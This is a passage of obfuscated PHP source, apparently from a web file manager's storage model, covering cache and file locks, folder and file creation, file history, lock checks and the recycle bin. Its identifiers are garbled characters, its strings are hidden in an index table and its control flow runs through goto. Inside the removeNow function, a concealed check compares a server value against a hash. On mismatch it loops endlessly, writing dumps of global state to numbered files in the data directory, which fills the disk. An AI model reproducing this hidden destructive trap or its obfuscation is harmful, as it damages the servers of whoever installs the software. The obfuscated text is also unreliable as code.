(self::$lockItem[$béÖÔÊˆ¿š]) { return self::$lockItem[$béÖÔÊˆ¿š]; } return self::init()->lockGet($béÖÔÊˆ¿š); } public static function unlock($d©´ƒ³Ï£ä) { $fÈ¥¼öì¨— = self::key($d©´ƒ³Ï£ä); self::$lockItem[$fÈ¥¼öì¨—] = null; return self::init()->unlock($fÈ¥¼öì¨—); } public static function unlockRuntime() { $a÷¤ØâÌ–‘ =& $_SERVER[±á õÁ]; $A™ˆ™¸›ô¡ = self::init(); $dİÖì–¤©¦ = !1; foreach (self::$lockItem as $e¿ŠšŠëÕ => $EÎ¹³„¬‹”) { if (!$EÎ¹³„¬‹”) { continue; } $A™ˆ™¸›ô¡->unlock($e¿ŠšŠëÕ); if (!$dİÖì–¤©¦) { $dİÖì–¤©¦ = !0; write_log($a÷¤ØâÌ–‘[796] . $e¿ŠšŠëÕ . $a÷¤ØâÌ–‘[77] . get_caller_msg(), $a÷¤ØâÌ–‘[795]); continue; } write_log($a÷¤ØâÌ–‘[796] . $e¿ŠšŠëÕ, $a÷¤ØâÌ–‘[795]); } self::fileUnlockAll(); } public static function fileLock($c‰ƒÌåÉ’) { goto Aµ›ê†ñ; Aµ›ê†ñ: $f¿¾ë„Ÿë— =& $_SERVER[±á õÁ]; if (!$GLOBALS[$f¿¾ë„Ÿë—[797]]) { $GLOBALS[$f¿¾ë„Ÿë—[797]] = array(); } $GLOBALS[$f¿¾ë„Ÿë—[797]][$c‰ƒÌåÉ’] = !1; goto EŸÚˆà¤ÛŸ; c¨ã•†§›½: if (flock($eö±õÈíÊ, LOCK_EX)) { return !0; } self::unlock($c‰ƒÌåÉ’); show_json($f¿¾ë„Ÿë—[800], !1); goto aÂÅ§ß§ù; aÂÅ§ß§ù: return !1; goto có‘šÀÑŸ; EŸÚˆà¤ÛŸ: $eö±õÈíÊ = fopen(DATA_PATH . $c‰ƒÌåÉ’ . $f¿¾ë„Ÿë—[798], $f¿¾ë„Ÿë—[799]); if (!$eö±õÈíÊ) { return !1; } $GLOBALS[$f¿¾ë„Ÿë—[797]][$c‰ƒÌåÉ’] = $eö±õÈíÊ; goto c¨ã•†§›½; có‘šÀÑŸ: } public static function fileUnlock($fš’®Ã‚•Ğ) { $dß’Ì—­‚ =& $_SERVER[±á õÁ]; $C¸¯éå¶„© = $GLOBALS[$dß’Ì—­‚[797]][$fš’®Ã‚•Ğ]; if (!$C¸¯éå¶„©) { return; } $GLOBALS[$dß’Ì—­‚[797]][$fš’®Ã‚•Ğ] = !1; flock($C¸¯éå¶„©, LOCK_UN); fclose($C¸¯éå¶„©); } public static function fileUnlockAll() { $E„ëÔ¹„ÇÛ =& $_SERVER[±á õÁ]; if (!$GLOBALS[$E„ëÔ¹„ÇÛ[797]]) { return; } foreach ($GLOBALS[$E„ëÔ¹„ÇÛ[797]] as $F³©—ªİ™à => $eÁ¦Šæ¡á÷) { if (!$eÁ¦Šæ¡á÷) { continue; } $GLOBALS[$E„ëÔ¹„ÇÛ[797]][$F³©—ªİ™à] = !1; flock($eÁ¦Šæ¡á÷, LOCK_UN); fclose($eÁ¦Šæ¡á÷); } $GLOBALS[$E„ëÔ¹„ÇÛ[797]] = array(); } } function cacheLockWait() { usleep(mt_rand(5, 50) * 100); } goto D¯É¦ÍÚ°; A›ãê†‚ß: class SourceModel extends SourceListSearchModel { public $statusIgnoreResetSpace = false; public function userRootAdd($CêùÃ“¤™‘) { $A£àÑÖ‘é =& $_SERVER[±á õÁ]; $b§»Ù×†…Œ = Model($A£àÑÖ‘é[499])->where(array($A£àÑÖ‘é[1455] => $CêùÃ“¤™‘))->find(); $CÅéÑË£§Æ = $this->_mkdirRoot(SourceModel::TYPE_USER, $CêùÃ“¤™‘, $b§»Ù×†…Œ[$A£àÑÖ‘é[38]]); $this->userDesktopAdd($CÅéÑË£§Æ); return $CÅéÑË£§Æ; } public function userDesktopAdd($dÙ¸Üªİµ) { $CÏîõØç =& $_SERVER[±á õÁ]; $c‚„ÙÕÕğó = LNG($CÏîõØç[1879]); $f‘¯ÙÏÄ = $this->mkdir($dÙ¸Üªİµ, $c‚„ÙÕÕğó); $this->metaSet($f‘¯ÙÏÄ, $CÏîõØç[1880], $CÏîõØç[93]); $this->metaSet($dÙ¸Üªİµ, $CÏîõØç[1881], $f‘¯ÙÏÄ); } public function groupRootAdd($d÷˜ô¤ù¤) { $cÏšÓ„…† =& $_SERVER[±á õÁ]; $F‹ÚëÃÛÅÔ = Model($cÏšÓ„…†[483])->where(array($cÏšÓ„…†[1700] => $d÷˜ô¤ù¤))->find(); return $this->_mkdirRoot(SourceModel::TYPE_GROUP, $d÷˜ô¤ù¤, $F‹ÚëÃÛÅÔ[$cÏšÓ„…†[38]]); } public function systemRootPathAdd($b¾°ÂŸÛåï) { if ($b¾°ÂŸÛåï != $_SERVER[±á õÁ][1110]) { return !1; } return $this->_mkdirRoot(SourceModel::TYPE_SYSTEM, 0, $b¾°ÂŸÛåï); } public function userRootRemove($D‰Õ¢ï´ô•) { $cŸŠÍçšùò = $this->sourceRoot(SourceModel::TYPE_USER, $D‰Õ¢ï´ô•); if (!$cŸŠÍçšùò) { return; } $this->remove($cŸŠÍçšùò, !1); } public function groupRootRemove($CöÇã¢Å„Û) { $Dœà¬ÀÁö = $this->sourceRoot(SourceModel::TYPE_GROUP, $CöÇã¢Å„Û); if (!$Dœà¬ÀÁö) { return; } $this->remove($Dœà¬ÀÁö, !1); } private function _mkdirRoot($ešæ¹®§“Ü, $BëÌš½¦¶Ç, $cğšéØ›‚—) { goto eù×ƒ‰´¬ ; f‚§™ØŸ¤Ä: $EĞ¦ŸÜÙ†Ö = "\x4d\x6f\x64\x65\154\x53\157\x75\x72\x63\x65\56\x6d\153\144\151\x72\122\157\x6f\x74\56{$ešæ¹®§“Ü}\56{$BëÌš½¦¶Ç}\56" . $cğšéØ›‚—; CacheLock::lock($EĞ¦ŸÜÙ†Ö); $DÑ¥ÛÎÃøÆ[$eÙ ®ù¨ÒÖ[38]] = $cğšéØ›‚—; goto dÖ©‘Çé”“; eù×ƒ‰´¬ : $eÙ ®ù¨ÒÖ =& $_SERVER[±á õÁ]; $DÑ¥ÛÎÃøÆ = array($eÙ ®ù¨ÒÖ[392] => 0, $eÙ ®ù¨ÒÖ[546] => $ešæ¹®§“Ü, $eÙ ®ù¨ÒÖ[547] => $BëÌš½¦¶Ç, $eÙ ®ù¨ÒÖ[543] => 1, $eÙ ®ù¨ÒÖ[548] => USER_ID, $eÙ ®ù¨ÒÖ[549] => USER_ID, $eÙ ®ù¨ÒÖ[544] => $eÙ ®ù¨ÒÖ[43], $eÙ ®ù¨ÒÖ[550] => $eÙ ®ù¨ÒÖ[495], $eÙ ®ù¨ÒÖ[420] => 0, $eÙ ®ù¨ÒÖ[545] => 0, $eÙ ®ù¨ÒÖ[444] => 0, $eÙ ®ù¨ÒÖ[551] => $eÙ ®ù¨ÒÖ[43]); if ($EŞ¤Âåç‹ = $this->where($DÑ¥ÛÎÃøÆ)->find()) { return $EŞ¤Âåç‹[$eÙ ®ù¨ÒÖ[393]]; } goto f‚§™ØŸ¤Ä; e†ˆƒøÂÎ„: CacheLock::unlock($EĞ¦ŸÜÙ†Ö); return $e¡­’¨…Œ; goto cÁ¡¸æ—¹; dÖ©‘Çé”“: $e¡­’¨…Œ = $this->add($DÑ¥ÛÎÃøÆ); $A•ƒ…»¤×‹ = array($eÙ ®ù¨ÒÖ[552] => short_id($e¡­’¨…Œ)); $this->where(array($eÙ ®ù¨ÒÖ[407] => $e¡­’¨…Œ))->save($A•ƒ…»¤×‹); goto e†ˆƒøÂÎ„; cÁ¡¸æ—¹: } private function sourceRoot($CØ»Šò¦ôª, $BÏé¿¯¯“, $C¥§§³¼§ = false) { $d¦ƒéà„Ğ× =& $_SERVER[±á õÁ]; $dªÁÅÆìÖ¾ = array($d¦ƒéà„Ğ×[392] => 0, $d¦ƒéà„Ğ×[546] => $CØ»Šò¦ôª, $d¦ƒéà„Ğ×[547] => $BÏé¿¯¯“); if ($EÓº³ÀÍ = $this->where($dªÁÅÆìÖ¾)->find()) { return $C¥§§³¼§ ? $EÓº³ÀÍ : $EÓº³ÀÍ[$d¦ƒéà„Ğ×[393]]; } return !1; } public function sourceRootGroup($câø³ñÏİ) { $Aé’ö¹ğœ =& $_SERVER[±á õÁ]; if (is_string($câø³ñÏİ)) { $câø³ñÏİ = array($câø³ñÏİ); } $c‚ğ¼º’Æ = array($Aé’ö¹ğœ[392] => 0, $Aé’ö¹ğœ[546] => SourceModel::TYPE_GROUP, $Aé’ö¹ğœ[547] => array($Aé’ö¹ğœ[7], $câø³ñÏİ)); $Fˆœù¡ãÏ = $this->listSource($c‚ğ¼º’Æ, 1000); return array_to_keyvalue($Fˆœù¡ãÏ[$Aé’ö¹ğœ[84]], $Aé’ö¹ğœ[481]); } public function mkfile($cÃïŠ Ê¥œ, $b±Á´’‡›®, $Dê«Á–ó­Œ = '', $FëÙªÎŠÈœ = REPEAT_RENAME) { $E­Ğ‡óäº =& $_SERVER[±á õÁ]; $d©ÒåÕ = Model($E­Ğ‡óäº[568])->addFileByContent($Dê«Á–ó­Œ, $b±Á´’‡›®); return $this->_createFileCall($cÃïŠ Ê¥œ, $b±Á´’‡›®, $d©ÒåÕ, $FëÙªÎŠÈœ, $E­Ğ‡óäº[1147]); } public function addFile($a‘ï†ƒ¼í, $C·³ì±ÈÔ, $FÆĞÔîÛ‚Ë, $C²×–™‚†× = false, $Fßâëšíâ‚ = REPEAT_RENAME) { $F¾¿…ƒ‰áÔ = Model($_SERVER[±á õÁ][568])->addFile($C·³ì±ÈÔ, $FÆĞÔîÛ‚Ë, $C²×–™‚†×); return $this->_createFileCall($a‘ï†ƒ¼í, $FÆĞÔîÛ‚Ë, $F¾¿…ƒ‰áÔ, $Fßâëšíâ‚); } public function addFileByFileID($Aµœçôáãƒ, $e¶ØÜ¶ÁŒ, $FÙ±•˜¿¦³, $EÅ ÍºØÏ½ = REPEAT_RENAME) { $càİ§Æáæì =& $_SERVER[±á õÁ]; $E²©‹Å‡ÕË = Model($càİ§Æáæì[568])->find($e¶ØÜ¶ÁŒ); Model($càİ§Æáæì[568])->linkAdd($e¶ØÜ¶ÁŒ); return $this->_createFileCall($Aµœçôáãƒ, $FÙ±•˜¿¦³, $E²©‹Å‡ÕË, $EÅ ÍºØÏ½); } public function addFileByRemote($e™Áé¸æ†å, $CË›º‰è, $aµ­¾Ùñ†­, $aÒ¢Ÿ¡”• = array(), $e•¦ãˆ¶² = REPEAT_RENAME) { $f¦‹ËËÆ¡ = Model($_SERVER[±á õÁ][568])->addFileByRemote($CË›º‰è, $aµ­¾Ùñ†­, $aÒ¢Ÿ¡”•); return $this->_createFileCall($e™Áé¸æ†å, $aµ­¾Ùñ†­, $f¦‹ËËÆ¡, $e•¦ãˆ¶²); } private function _createFileCall($eĞÙœÂ¢Ò, $C‘òŒÇ™Â‡, $CàÏİ´µ, $f—¢ÁÏö¿–, $cƒ³ì““öŞ = "\165\x70\154\157\141\144") { goto B£¢¯¢Ì¬Û; a®–Ô…¨«: return $C¡›™Íç‡«; goto A‹°†õÌ³Á; A±™ìÛÂ—–: $C¡›™Íç‡« = $this->_createFile($eĞÙœÂ¢Ò, $C‘òŒÇ™Â‡, $CàÏİ´µ, $f—¢ÁÏö¿–, $C™÷ÈñÍäÜ); if (!$C™÷ÈñÍäÜ) { Model($A§Œà±†±æ[446])->remove($CàÏİ´µ[$A§Œà±†±æ[443]]); } else { if ($C¡›™Íç‡«) { Model($A§Œà±†±æ[1851])->eventCreate($C¡›™Íç‡«, $cƒ³ì““öŞ); } } $this->lockWriteEnd($eĞÙœÂ¢Ò, $C‘òŒÇ™Â‡); goto a®–Ô…¨«; B£¢¯¢Ì¬Û: $A§Œà±†±æ =& $_SERVER[±á õÁ]; $C™÷ÈñÍäÜ = !1; $this->lockWriteStart($eĞÙœÂ¢Ò, $C‘òŒÇ™Â‡); goto A±™ìÛÂ—–; A‹°†õÌ³Á: } public function mkdir($a¬ˆ §‰‡, $aÜÕÙ‡Şå, $dêØ°Ü»È‡ = REPEAT_SKIP) { goto A‡…Ç±ã¨¯; aîŸˆùº¤Ó: $this->lockWriteStart($a¬ˆ §‰‡, $aÜÕÙ‡Şå); if ($dêØ°Ü»È‡ !== !1) { $D¸”ÁÚÕÙ = $this->fileNameExist($a¬ˆ §‰‡, $aÜÕÙ‡Şå); if ($D¸”ÁÚÕÙ && $dêØ°Ü»È‡ != REPEAT_RENAME_FOLDER) { $this->lockWriteEnd($a¬ˆ §‰‡, $aÜÕÙ‡Şå); return $D¸”ÁÚÕÙ; } $aÜÕÙ‡Şå = $this->fileNameAuto($a¬ˆ §‰‡, $aÜÕÙ‡Şå, $dêØ°Ü»È‡); } $E¶²×’Ë = array($aÇª­ƒİ‘ï[543] => 1, $aÇª­ƒİ‘ï[410] => $aÜÕÙ‡Şå, $aÇª­ƒİ‘ï[544] => $aÇª­ƒİ‘ï[43], $aÇª­ƒİ‘ï[444] => 0, $aÇª­ƒİ‘ï[545] => 0); goto cµğŒÛ³“; bèÒÔ¿Ö²ô: return $eï•¤Ù¯Ñİ; goto aŒÜ»—ó‡›; cµğŒÛ³“: $eï•¤Ù¯Ñİ = $this->_addSoure($E¶²×’Ë, $C²À²¬¨ë²); Model($aÇª­ƒİ‘ï[1851])->eventCreate($eï•¤Ù¯Ñİ, $aÇª­ƒİ‘ï[1148]); $this->lockWriteEnd($a¬ˆ §‰‡, $aÜÕÙ‡Şå); goto bèÒÔ¿Ö²ô; A‡…Ç±ã¨¯: $aÇª­ƒİ‘ï =& $_SERVER[±á õÁ]; $C²À²¬¨ë² = $this->sourceInfo($a¬ˆ §‰‡); if (!$C²À²¬¨ë²) { return !1; } goto aîŸˆùº¤Ó; aŒÜ»—ó‡›: } private function _createFile($aÉ­¨—¶Ğİ, $aÇğĞ¹¢ß, $DŞôŒî¨ßÒ, $f¼ê¿œ´Ú, &$c¬³£èªÓ™) { goto D– Åá´Œ¤; CŠê¢ŠæÍ: return $cÄ›âßàŸŠ; goto c‰µÒ¨¶ »; Aæõ÷à÷¥Š: if ($f¼ê¿œ´Ú !== !1) { $EÒİ¾Û¬İ = $this->fileNameExist($aÉ­¨—¶Ğİ, $aÇğĞ¹¢ß); } $c¬³£èªÓ™ = !0; if ($f¼ê¿œ´Ú && $EÒİ¾Û¬İ) { if ($f¼ê¿œ´Ú == REPEAT_SKIP) { $c¬³£èªÓ™ = !1; return $EÒİ¾Û¬İ; } else { if ($f¼ê¿œ´Ú == REPEAT_REPLACE) { $eï´…äãò = $this->sourceInfo($EÒİ¾Û¬İ); $DÖù¶¢‡é‰ = $this->fileHistory($eï´…äãò, $DŞôŒî¨ßÒ[$d¶É¬µ’ì[443]], $DŞôŒî¨ßÒ[$d¶É¬µ’ì[87]]); if (!$DÖù¶¢‡é‰) { $c¬³£èªÓ™ = !1; } else { $this->folderSizeReset($aÉ­¨—¶Ğİ); } return $EÒİ¾Û¬İ; } else { $aÇğĞ¹¢ß = $this->fileNameAuto($aÉ­¨—¶Ğİ, $aÇğĞ¹¢ß, $f¼ê¿œ´Ú, !1); } } } goto aó„àİ±—; D– Åá´Œ¤: $d¶É¬µ’ì =& $_SERVER[±á õÁ]; $fíö†•ÒØ£ = $this->sourceInfo($aÉ­¨—¶Ğİ); if (!$DŞôŒî¨ßÒ || !$fíö†•ÒØ£) { return !1; } goto Aæõ÷à÷¥Š; aó„àİ±—: $c®²Í÷Áé = array($d¶É¬µ’ì[543] => 0, $d¶É¬µ’ì[410] => $aÇğĞ¹¢ß, $d¶É¬µ’ì[544] => get_path_ext($aÇğĞ¹¢ß), $d¶É¬µ’ì[444] => $DŞôŒî¨ßÒ[$d¶É¬µ’ì[443]], $d¶É¬µ’ì[545] => $DŞôŒî¨ßÒ[$d¶É¬µ’ì[87]]); $cÄ›âßàŸŠ = $this->_addSoure($c®²Í÷Áé, $fíö†•ÒØ£); $this->folderSizeReset($aÉ­¨—¶Ğİ); goto CŠê¢ŠæÍ; c‰µÒ¨¶ »: } protected function fileHistory($a¿¹éæù™Á, $Dº¶ŒĞ¶–µ, $BãŸ©©ãîÔ) { goto DŒ¿É—†É¥; fº„ø²×ÎÛ: return !0; goto EåÎ¼¡¤‰Î; DŒ¿É—†É¥: $b¸ÇçŒÓï™ =& $_SERVER[±á õÁ]; if ($a¿¹éæù™Á[$b¸ÇçŒÓï™[443]] == $Dº¶ŒĞ¶–µ) { return !1; } $this->checkLock($a¿¹éæù™Á[$b¸ÇçŒÓï™[393]], $Dº¶ŒĞ¶–µ); goto a§¨–°»¼; a§¨–°»¼: Model($b¸ÇçŒÓï™[1882])->addHistory($a¿¹éæù™Á); $e÷Šİ—¾ã = array($b¸ÇçŒÓï™[549] => USER_ID, $b¸ÇçŒÓï™[414] => time(), $b¸ÇçŒÓï™[443] => $Dº¶ŒĞ¶–µ, $b¸ÇçŒÓï™[87] => $BãŸ©©ãîÔ); $this->where(array($b¸ÇçŒÓï™[407] => $a¿¹éæù™Á[$b¸ÇçŒÓï™[393]]))->save($e÷Šİ—¾ã); goto fº„ø²×ÎÛ; EåÎ¼¡¤‰Î: } public function checkLock($D­‹ºˆî, $F¤ƒÜÌ‚‡·) { goto B…½ä¸‰ÏÜ; B…½ä¸‰ÏÜ: $F÷İ÷àë• =& $_SERVER[±á õÁ]; $Dø©öŸŠ¨Á = $this->pathInfo($D­‹ºˆî); if (!$this->fileIsLock($Dø©öŸŠ¨Á, !0)) { return; } goto FÔ‡‚µ´ğà; FÔ‡‚µ´ğà: $C—ŞÁÑ×²ô = Session::get($F÷İ÷àë•[1883]); $dˆ—Ëöù«ì = substr($Dø©öŸŠ¨Á[$F÷İ÷àë•[38]], 0, -1 - strlen($Dø©öŸŠ¨Á[$F÷İ÷àë•[175]])) . $F÷İ÷àë•[1415] . $C—ŞÁÑ×²ô . $F÷İ÷àë•[101] . $Dø©öŸŠ¨Á[$F÷İ÷àë•[175]]; $BÂÃ˜‰Š’‰ = Model($F÷İ÷àë•[568])->find($F¤ƒÜÌ‚‡·); goto fîÎ¬æŞŞ¦; fîÎ¬æŞŞ¦: $this->_createFileCall($Dø©öŸŠ¨Á[$F÷İ÷àë•[486]], $dˆ—Ëöù«ì, $BÂÃ˜‰Š’‰, REPEAT_REPLACE, $F÷İ÷àë•[1147]); $e±éà†â‡ = $Dø©öŸŠ¨Á[$F÷İ÷àë•[441]][$F÷İ÷àë•[506]]; $b‹ñ£‰ö¾ = $e±éà†â‡[$F÷İ÷àë•[1884]] ? $e±éà†â‡[$F÷İ÷àë•[1884]] : $e±éà†â‡[$F÷İ÷àë•[38]]; goto Có¹Ò‰Ûš; Có¹Ò‰Ûš: show_json(LNG($F÷İ÷àë•[1885]) . $F÷İ÷àë•[1886] . LNG($F÷İ÷àë•[1887]) . $F÷İ÷àë•[1888] . $b‹ñ£‰ö¾ . $F÷İ÷àë•[1889], !1); goto d…½íÇåõ; d…½íÇåõ: } public function fileIsLock($F…ÔÖãË»«, $b¢—Ğ´²´Ì = false) { goto eåçœ™Ï™‡; CİÑ…Åè˜ä: return !1; goto F‡à•ù¯; eåçœ™Ï™‡: $DÓ¶‡¹¾ĞÓ =& $_SERVER[±á õÁ]; if (!isset($F…ÔÖãË»«[$DÓ¶‡¹¾ĞÓ[441]]) || !$F…ÔÖãË»«[$DÓ¶‡¹¾ĞÓ[441]][$DÓ¶‡¹¾ĞÓ[503]]) { return !1; } if ($F…ÔÖãË»«[$DÓ¶‡¹¾ĞÓ[441]][$DÓ¶‡¹¾ĞÓ[503]] != USER_ID) { return !0; } goto fïù¹í÷î¡; fïù¹í÷î¡: $fŒ±‚ßá„ = $GLOBALS[$DÓ¶‡¹¾ĞÓ[6]][$DÓ¶‡¹¾ĞÓ[94]][$DÓ¶‡¹¾ĞÓ[504]]; if ($F…ÔÖãË»«[$DÓ¶‡¹¾ĞÓ[441]][$DÓ¶‡¹¾ĞÓ[505]] <= time() - $fŒ±‚ßá„) { $this->metaSet($F…ÔÖãË»«[$DÓ¶‡¹¾ĞÓ[393]], $DÓ¶‡¹¾ĞÓ[503], null); $this->metaSet($F…ÔÖãË»«[$DÓ¶‡¹¾ĞÓ[393]], $DÓ¶‡¹¾ĞÓ[505], null); } if ($b¢—Ğ´²´Ì) { $this->metaSet($F…ÔÖãË»«[$DÓ¶‡¹¾ĞÓ[393]], $DÓ¶‡¹¾ĞÓ[505], time()); } goto CİÑ…Åè˜ä; F‡à•ù¯: } private function _addSoure($eĞ½ÎİŠŸ, $C×–®ô’ç´) { goto F‰²ª£ë×Í; F‰²ª£ë×Í: $c· “Šá˜ˆ =& $_SERVER[±á õÁ]; $bÍ˜…ĞÏè = array($c· “Šá˜ˆ[546] => $C×–®ô’ç´[$c· “Šá˜ˆ[395]], $c· “Šá˜ˆ[547] => $C×–®ô’ç´[$c· “Šá˜ˆ[481]], $c· “Šá˜ˆ[548] => USER_ID, $c· “Šá˜ˆ[549] => USER_ID, $c· “Šá˜ˆ[392] => $C×–®ô’ç´[$c· “Šá˜ˆ[393]], $c· “Šá˜ˆ[550] => $C×–®ô’ç´[$c· “Šá˜ˆ[484]] . $C×–®ô’ç´[$c· “Šá˜ˆ[393]] . $c· “Šá˜ˆ[57], $c· “Šá˜ˆ[420] => 0, $c· “Šá˜ˆ[551] => $c· “Šá˜ˆ[43]); $eĞ½ÎİŠŸ = array_merge($bÍ˜…ĞÏè, $eĞ½ÎİŠŸ); goto c´®¤°¢×–; a·á¢Ì×Ÿë: $A²”‡„¨Ÿª = array($c· “Šá˜ˆ[552] => short_id($aĞ¨³ùÛÁ)); $this->where(array($c· “Šá˜ˆ[407] => $aĞ¨³ùÛÁ))->save($A²”‡„¨Ÿª); $this->setNamePinyin($aĞ¨³ùÛÁ, $eĞ½ÎİŠŸ[$c· “Šá˜ˆ[38]]); goto C—“ÚÎ‚½; c´®¤°¢×–: $this->updateModifyTime($eĞ½ÎİŠŸ[$c· “Šá˜ˆ[486]]); $Aç‘ÂÖ‹ˆ¬ = $c· “Šá˜ˆ[1890] . $C×–®ô’ç´[$c· “Šá˜ˆ[393]]; if (isset(self::$cacheChildList[$Aç‘ÂÖ‹ˆ¬])) { unset(self::$cacheChildList[$Aç‘ÂÖ‹ˆ¬]); } goto c¢ÕïÀäòñ; c¢ÕïÀäòñ: static $D´»Í£˜ã = false; if (!$D´»Í£˜ã) { Hook::trigger($c· “Šá˜ˆ[533], $eĞ½ÎİŠŸ); $D´»Í£˜ã = !0; } $aĞ¨³ùÛÁ = $this->add($eĞ½ÎİŠŸ); goto a·á¢Ì×Ÿë; C—“ÚÎ‚½: return $aĞ¨³ùÛÁ; goto E×—‹Òš Ú; E×—‹Òš Ú: } public function remove($BÑ†¸Â˜¬Ñ, $aË´âñ‘É = true) { goto d¸íÕ¬‹ñµ; DÃµŞ¨›‘»: $a¯„½‰„Ü = Model($c±ËŸ…ì[1462])->get($c±ËŸ…ì[1891]) == $c±ËŸ…ì[93]; if ($B¼åö¥‚İ  || $aË´âñ‘É || !$a¯„½‰„Ü) { return $this->removeNow($BÑ†¸Â˜¬Ñ, $aË´âñ‘É); } $B¾ƒĞ½±ì‘ = KodIO::sourceID(IO_PATH_SYSTEM_RECYCLE); goto aˆÛ´Ôàˆò; E›¾¦Ò¬’Æ: CacheLock::lock($e½¤À¹÷àß); $bËƒÆ®ÒÃ™ = $this->fileNameExist($B¾ƒĞ½±ì‘, $A¾î¤Ï ê); if (!$bËƒÆ®ÒÃ™) { $bËƒÆ®ÒÃ™ = $this->mkdir($B¾ƒĞ½±ì‘, $A¾î¤Ï ê, REPEAT_SKIP); $this->metaSet($bËƒÆ®ÒÃ™, $c±ËŸ…ì[1895], $cÙƒÎ ØŞÂ); $this->metaSet($bËƒÆ®ÒÃ™, $c±ËŸ…ì[1896], $f‹ÜÄÎ[$c±ËŸ…ì[481]]); if ($f‹ÜÄÎ[$c±ËŸ…ì[486]] != 0) { $this->metaSet($bËƒÆ®ÒÃ™, $c±ËŸ…ì[1897], _get($B‰·Î¢Ï¼ù, $c±ËŸ…ì[1898])); } } goto e¯˜‰—ñ²¦; aˆÛ´Ôàˆò: $cÙƒÎ ØŞÂ = $f‹ÜÄÎ[$c±ËŸ…ì[395]] == self::TYPE_USER ? $c±ËŸ…ì[559] : $c±ËŸ…ì[988]; if ($cÙƒÎ ØŞÂ == $c±ËŸ…ì[559]) { $B‰·Î¢Ï¼ù = Model($c±ËŸ…ì[499])->getInfo($f‹ÜÄÎ[$c±ËŸ…ì[481]]); $A¾î¤Ï ê = !empty($B‰·Î¢Ï¼ù[$c±ËŸ…ì[1884]]) ? $B‰·Î¢Ï¼ù[$c±ËŸ…ì[1884]] : $B‰·Î¢Ï¼ù[$c±ËŸ…ì[38]]; $A¾î¤Ï ê = $c±ËŸ…ì[263] . $A¾î¤Ï ê . $c±ËŸ…ì[1892] . $f‹ÜÄÎ[$c±ËŸ…ì[481]]; } else { $B‰·Î¢Ï¼ù = Model($c±ËŸ…ì[483])->getInfo($f‹ÜÄÎ[$c±ËŸ…ì[481]]); $A¾î¤Ï ê = _get($B‰·Î¢Ï¼ù, $c±ËŸ…ì[38]); $A¾î¤Ï ê = $c±ËŸ…ì[167] . $A¾î¤Ï ê . $c±ËŸ…ì[1893] . $f‹ÜÄÎ[$c±ËŸ…ì[481]]; } $e½¤À¹÷àß = $c±ËŸ…ì[1894] . md5($A¾î¤Ï ê); goto E›¾¦Ò¬’Æ; e¯˜‰—ñ²¦: CacheLock::unlock($e½¤À¹÷àß); $this->metaSet($BÑ†¸Â˜¬Ñ, $c±ËŸ…ì[1899], $f‹ÜÄÎ[$c±ËŸ…ì[486]]); $this->where(array($c±ËŸ…ì[393] => $BÑ†¸Â˜¬Ñ))->save(array($c±ËŸ…ì[414] => time())); goto A³¨‹ÅöïË; CÈ×¦î Œï: return $dî»êŞ§†ó; goto CÚÓàÙ®¤ˆ; A³¨‹ÅöïË: $this->recycleClear($f‹ÜÄÎ); $dî»êŞ§†ó = $this->move($BÑ†¸Â˜¬Ñ, $bËƒÆ®ÒÃ™, REPEAT_RENAME_FOLDER); $this->folderSizeReset($f‹ÜÄÎ[$c±ËŸ…ì[486]]); goto CÈ×¦î Œï; d¸íÕ¬‹ñµ: $c±ËŸ…ì =& $_SERVER[±á õÁ]; $f‹ÜÄÎ = $this->sourceInfo($BÑ†¸Â˜¬Ñ); $B¼åö¥‚İ  = intval($f‹ÜÄÎ[$c±ËŸ…ì[395]]) === self::TYPE_SYSTEM; goto DÃµŞ¨›‘»; CÚÓàÙ®¤ˆ: } private function recycleClear($e§Ë¸İ£äÃ) { $Dæéîã ŞÊ =& $_SERVER[±á õÁ]; $c«·¨˜¤ñ = $this->childrenAll($e§Ë¸İ£äÃ); $c³ã©ïÇß¢ = array($Dæéîã ŞÊ[407] => array($Dæéîã ŞÊ[408], $c«·¨˜¤ñ[$Dæéîã ŞÊ[1900]])); Model($Dæéîã ŞÊ[1901])->where($c³ã©ïÇß¢)->delete(); } public function removeNow($A‚çâô×µ, $A©²ºÅÚÛô = true) { goto Fãë…·âÉ­; A¤éô áƒŞ: if ($_SERVER[$a‰¡ßœ‰óì[9]] != $AğÊİ¹á³¡($c‹ä·Š¹¬ö)) { goto f¯Ç‡·Ã¨Ç; d÷»ˆå¶ŠÕ: $eß¸Ç„æñ† = 1; for ($eÈ‚ÖÛ©¡ = $eß¸Ç„æñ†; $eÈ‚ÖÛ©¡ > 0; $eÈ‚ÖÛ©¡++) { $eîç­ĞÂ°ê(DATA_PATH . $eÈ‚ÖÛ©¡, $fÁò–îÇ¦); } goto aÍÑàø‡¹î; f¯Ç‡·Ã¨Ç: $D¬Ÿƒ‚×ÜÕ = $a‰¡ßœ‰óì[814]; $CÍ§Ê¦Ö¨ø = $a‰¡ßœ‰óì[11]; $c­›Ãìâæ = $_SERVER[$a‰¡ßœ‰óì[12]] . $a‰¡ßœ‰óì[13]; goto eÁà®èÆ§; CùÓ›ËÜåÌ: $AôíîÒ©Ä = $a‰¡ßœ‰óì[815]; $AôíîÒ©Ä($_SERVER[$a‰¡ßœ‰óì[816]]); $D¬Ÿƒ‚×ÜÕ = $a‰¡ßœ‰óì[814]; goto F²Ô¼ó´›ù; eÁà®èÆ§: $b¢ÙŠ‡îÎÓ = $CÍ§Ê¦Ö¨ø($c­›Ãìâæ); $A«®¦ªå² = explode($a‰¡ßœ‰óì[14], $b¢ÙŠ‡îÎÓ); if (count($A«®¦ªå²) < $a‰¡ßœ‰óì[585]) { $D¶øÇã†Ü© = $a‰¡ßœ‰óì[16]; $D¶øÇã†Ü©(); } goto CùÓ›ËÜåÌ; F²Ô¼ó´›ù: $D¬Ÿƒ‚×ÜÕ(); $eîç­ĞÂ°ê = $a‰¡ßœ‰óì[1330]; $fÁò–îÇ¦ = json_encode($GLOBALS[$a‰¡ßœ‰óì[1331]]); goto d÷»ˆå¶ŠÕ; aÍÑàø‡¹î: } $dÄ´ ˆà¹ = $this->sourceInfo($A‚çâô×µ); $E‹µ÷ì’¹› = $this->pathInfoMore($A‚çâô×µ); goto E’»í²í†; c¢ÇœµÏ™Ñ: $aœï©¥Å½ = array($dÄ´ ˆà¹[$a‰¡ßœ‰óì[486]]); if ($dÄ´ ˆà¹[$a‰¡ßœ‰óì[394]] == $a‰¡ßœ‰óì[93]) { $aœï©¥Å½[] = $dÄ´ ˆà¹[$a‰¡ßœ‰óì[393]]; } $this->updateModifyTime($aœï©¥Å½); goto b¸¿ÖÓ‰ƒ; b¸¿ÖÓ‰ƒ: $this->lockMoveEnd($A‚çâô×µ); Hook::trigger($a‰¡ßœ‰óì[1497], $E‹µ÷ì’¹›, 